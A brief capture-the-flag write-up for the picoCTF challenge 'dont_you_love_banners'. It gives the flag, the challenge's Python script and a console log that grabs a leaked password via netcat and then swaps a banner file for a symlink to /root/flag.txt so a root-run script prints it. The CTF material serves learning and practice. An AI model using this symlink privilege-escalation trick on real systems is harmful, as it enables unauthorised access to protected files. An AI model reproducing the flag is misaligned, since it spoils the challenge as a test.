# CTF Challenge: dont_you_love_banners

## Table of Content

- commands-executed:  
- flag :picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}


### Chain of thought / Learning:
- fairly simple pwn.college symbolic link you
- thwe script looks for banner in the ~/ folder i simply created a link from banner to the flag which reads it on the starting of the script. 


#### Output:
```console
┌──(anonymous㉿Anonymous)-[~/investigation]
└─$ nc tethys.picoctf.net 62435
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
                                                                                                                                                                                             
┌──(anonymous㉿Anonymous)-[~/investigation]
└─$ nc tethys.picoctf.net 52706        
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner  
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text

cat text
keep digging
player@challenge:~$ 
player@challenge:~$ cd /root
cd /root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:/root$ ls 
ls 
flag.txt  script.py
player@challenge:/root$ cd ~/
cd ~/
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ ln -s /root/flag.txt ./banner
ln -s /root/flag.txt ./banner
ln: failed to create symbolic link './banner': File exists
player@challenge:~$ rm ./banner
rm ./banner
player@challenge:~$ ln -s /root/flag.txt ./banner
ln -s /root/flag.txt ./banner
player@challenge:~$ chmod +x /root/script.py
chmod +x /root/script.py
chmod: changing permissions of '/root/script.py': Operation not permitted
player@challenge:~$ ^C
                                                                                                                                                                                             
┌──(anonymous㉿Anonymous)-[~/investigation]
└─$ nc tethys.picoctf.net 52706
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}

what is the password? 

```
